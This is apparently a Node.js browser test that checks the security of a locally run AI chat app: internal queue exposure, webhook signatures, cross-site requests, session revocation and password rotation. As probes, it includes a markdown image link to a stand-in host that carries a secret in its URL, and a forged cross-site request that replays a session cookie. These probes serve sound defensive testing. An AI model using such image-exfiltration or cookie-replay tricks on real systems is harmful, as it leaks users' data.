import assert from "node:assert/strict";
import { createHmac, randomUUID } from "node:crypto";
import { writeFile } from "node:fs/promises";
import { connect } from "node:net";
import { networkInterfaces } from "node:os";
import { resolve, join } from "node:path";
import { launchBrowser } from "./browser.mjs";
const origin = process.env.CHECK_ORIGIN || "http://localhost:3000";
if (!["localhost", "127.0.0.1"].includes(new URL(origin).hostname))
  throw new Error("Local fixture only.");
const output = resolve(process.env.QA_ARTIFACTS || "/tmp/aegentica-qa");
const browser = await launchBrowser();
const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
const page = await context.newPage();
const errors = [];
page.on("pageerror", (error) => errors.push(error.message));
/** Whether a TCP connection to host:port opens within two seconds. */
const listening = (host, port) =>
  new Promise((done) => {
    const socket = connect({ host, port });
    socket.setTimeout(2000, () => (socket.destroy(), done(false)));
    socket.once("connect", () => (socket.destroy(), done(true)));
    socket.once("error", () => done(false));
  });
try {
  // eve's workflow queue delivers runs without authentication, so it must stay
  // internal: the public app does not proxy it and eve listens on loopback only.
  const flow = await fetch(origin + "/.well-known/workflow/v1/flow", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-vqs-queue-name": "__wkf_workflow_probe",
      "x-vqs-message-id": "probe",
      "x-vqs-message-attempt": "1",
    },
    body: "{}",
  });
  assert.equal(flow.status, 404, "the workflow queue is not reachable through the app");
  const evePort = Number(process.env.EVE_NEXT_PRODUCTION_PORT || 4274);
  assert(await listening("127.0.0.1", evePort), "eve answers on loopback");
  const external = Object.values(networkInterfaces())
    .flat()
    .filter((address) => address && !address.internal && address.family === "IPv4")
    .map((address) => address.address);
  for (const address of external)
    assert.equal(await listening(address, evePort), false, `eve must not listen on ${address}`);

  // Webhooks without their signature header stop at the app (proxy.ts).
  for (const path of ["/eve/v1/telegram", "/eve/v1/slack"]) {
    const unsigned = await fetch(origin + path, { method: "POST", body: "{}" });
    assert.equal(unsigned.status, 401, `${path} needs its signature header`);
  }
  // Another site's form cannot fill the new-chat draft through the /share fallback.
  const shareForm = new FormData();
  shareForm.set("text", "cross-site draft");
  const crossSiteShare = await fetch(origin + "/share", {
    method: "POST",
    headers: { "sec-fetch-site": "cross-site" },
    body: shareForm,
    redirect: "manual",
  });
  assert.equal(crossSiteShare.status, 403, "a cross-site share is refused");
  // The scheduled-task token works on eve's loopback port only, even when correct.
  const internalToken = createHmac("sha256", process.env.EVE_SESSION_SECRET.trim())
    .update("aegentica/internal/v1")
    .digest("hex");
  const internal = await fetch(origin + "/eve/v1/session", {
    method: "POST",
    headers: { "content-type": "application/json", "x-aegentica-internal": internalToken },
    body: JSON.stringify({ message: "internal token probe" }),
  });
  assert.equal(internal.status, 401, "the internal header is dropped by the public app");

  // Signed out, bootstrap says only whether and how to sign in.
  const anonymous = await (await fetch(origin + "/api/bootstrap")).json();
  assert.deepEqual(Object.keys(anonymous.setupStatus).sort(), [
    "appReady",
    "authMode",
    "authReady",
  ]);
  assert.equal(anonymous.viewer, null);
  assert.deepEqual(anonymous.chats, []);

  await page.goto(origin, { waitUntil: "domcontentloaded" });
  // A click that lands before hydration is dropped; retry until the dialog opens.
  const username = page.getByLabel("Username", { exact: true });
  for (let attempt = 0; !(await username.isVisible()); attempt++) {
    assert(attempt < 10, "sign-in dialog opens");
    await page.getByRole("button", { name: "Sign in", exact: true }).first().click();
    await username.waitFor({ timeout: 3000 }).catch(() => {});
  }
  await page.getByLabel("Username", { exact: true }).fill(process.env.EVE_CHAT_USERNAME);
  await page.getByLabel("Password", { exact: true }).fill(process.env.EVE_CHAT_PASSWORD);
  await page.locator("form").getByRole("button", { name: "Sign in", exact: true }).click();
  await page.waitForFunction(async () => (await fetch("/api/settings/security")).status === 200);
  await page.getByLabel("Password", { exact: true }).waitFor({ state: "hidden" });
  const cookie = (await context.cookies()).find((item) => item.name === "eve_chat_session");
  assert(cookie);
  const signedIn = await (await context.request.get(origin + "/api/bootstrap")).json();
  assert.equal(signedIn.setupStatus.storageMode, "database", "the operator gets the full status");

  // A reply cannot load an image from another site (a way to carry data out
  // with no click): it shows as a link. The mock model echoes the message.
  const leaks = [];
  page.on("request", (request) => {
    if (request.url().includes("exfil.invalid")) leaks.push(request.url());
  });
  const composer = page.getByRole("textbox", { name: "Message Ægentica", exact: true });
  const send = page.getByRole("button", { name: "Send message", exact: true });
  const leak = "https://exfil.invalid/leak.png?d=operator-secret";
  for (let attempt = 0; !(await send.isEnabled()); attempt++) {
    assert(attempt < 10, "the composer takes text");
    await composer.fill(`Image probe ![chart](${leak})`);
    await page.waitForTimeout(300);
  }
  await send.click();
  await page.getByText("Mock reply: Image probe", { exact: false }).first().waitFor();
  await page.waitForFunction((href) => document.querySelector(`a[href="${href}"]`), leak);
  assert.equal(await page.locator('img[src*="exfil.invalid"]').count(), 0);
  assert.deepEqual(leaks, [], "no request to the image's host");

  // That send was a same-origin write through the /eve proxy. Another site's
  // form post carries the same cookie, and eve refuses it.
  const foreign = await fetch(origin + "/eve/v1/session", {
    method: "POST",
    headers: {
      cookie: `eve_chat_session=${cookie.value}`,
      origin: "https://evil.example",
      "content-type": "text/plain",
    },
    body: JSON.stringify({ message: "cross-site probe" }),
  });
  assert.equal(foreign.status, 401, "a cookie-carrying write from another site is refused");
  const before = await (await context.request.get(origin + "/api/agents")).json();
  await page.goto(origin + "/settings/security", { waitUntil: "domcontentloaded" });
  await page.getByLabel("Current password", { exact: true }).fill(process.env.EVE_CHAT_PASSWORD);
  const password = "Browser-fixture-" + randomUUID();
  await page.getByLabel("New password", { exact: true }).fill(password);
  await page.getByLabel("Confirm new password", { exact: true }).fill(password);
  await page.getByRole("button", { name: "Change password", exact: true }).click();
  await page.getByRole("status").filter({ hasText: "Password changed." }).waitFor();
  assert.equal((await context.request.get(origin + "/api/agents")).status(), 200);
  assert.deepEqual(await (await context.request.get(origin + "/api/agents")).json(), before);
  assert.equal(
    (
      await context.request.get(origin + "/api/agents", {
        headers: { Cookie: `eve_chat_session=${cookie.value}` },
      })
    ).status(),
    401,
  );
  await page.screenshot({ path: join(output, "desktop-security.png"), fullPage: true });
  await page.setViewportSize({ width: 390, height: 844 });
  assert.equal(
    await page.evaluate(() => document.documentElement.scrollWidth > innerWidth + 1),
    false,
  );
  await page.screenshot({ path: join(output, "mobile-security.png"), fullPage: true });

  // Signing out ends that session on the server: a copy of the cookie stops working.
  const agentsWith = (cookie) => fetch(origin + "/api/agents", { headers: { cookie } });
  const login = await fetch(origin + "/api/password-auth/login", {
    method: "POST",
    headers: { origin, "content-type": "application/json" },
    body: JSON.stringify({ username: process.env.EVE_CHAT_USERNAME, password }),
  });
  assert.equal(login.status, 200);
  const copied = login.headers
    .getSetCookie()
    .find((item) => item.startsWith("eve_chat_session="))
    ?.split(";")[0];
  assert.equal((await agentsWith(copied)).status, 200);
  const logout = await fetch(origin + "/api/password-auth/logout", {
    method: "POST",
    headers: { origin, cookie: copied },
  });
  assert.equal(logout.status, 200);
  assert.equal((await agentsWith(copied)).status, 401, "a signed-out cookie stays signed out");

  // Sign out everywhere ends every session, this browser's included.
  const current = (await context.cookies()).find((item) => item.name === "eve_chat_session");
  await page.setViewportSize({ width: 1440, height: 1000 });
  await page.goto(origin + "/settings/security", { waitUntil: "domcontentloaded" });
  const confirm = page.getByRole("alertdialog");
  for (let attempt = 0; !(await confirm.isVisible()); attempt++) {
    assert(attempt < 10, "Sign out everywhere asks first");
    await page.getByRole("button", { name: "Sign out everywhere", exact: true }).click();
    await confirm.waitFor({ timeout: 3000 }).catch(() => {});
  }
  await confirm.getByRole("button", { name: "Sign out everywhere", exact: true }).click();
  await page.waitForURL(origin + "/");
  await page.getByRole("button", { name: "Sign in", exact: true }).first().waitFor();
  assert.equal((await agentsWith(`eve_chat_session=${current.value}`)).status, 401);
  assert.equal(errors.length, 0);
  await writeFile(
    join(output, "security-browser-results.json"),
    JSON.stringify({
      passed: true,
      checks: [
        "workflow queue not public",
        "eve on loopback only",
        "unsigned webhooks refused",
        "cross-site share refused",
        "signed-out bootstrap has no setup details",
        "internal token refused through the app",
        "external reply images are links, never loaded",
        "eve refuses cross-site writes with the cookie",
        "UI password rotation",
        "old cookie revoked",
        "sign-out revokes the cookie on the server",
        "sign out everywhere",
        "profiles preserved",
        "mobile viewport fits",
      ],
      pageErrors: errors,
    }),
  );
  console.log(
    "PASS: internal workflow queue closed, eve on loopback, unsigned webhooks and the internal token refused through the app, external reply images not loaded, cross-site eve writes refused, password rotation through UI, revoked cookie, preserved profiles, mobile layout, server-side sign-out and Sign out everywhere",
  );
} catch (error) {
  await page
    .screenshot({ path: join(output, "security-failure.png"), fullPage: true })
    .catch(() => {});
  throw error;
} finally {
  await context.close();
  await browser.close();
}
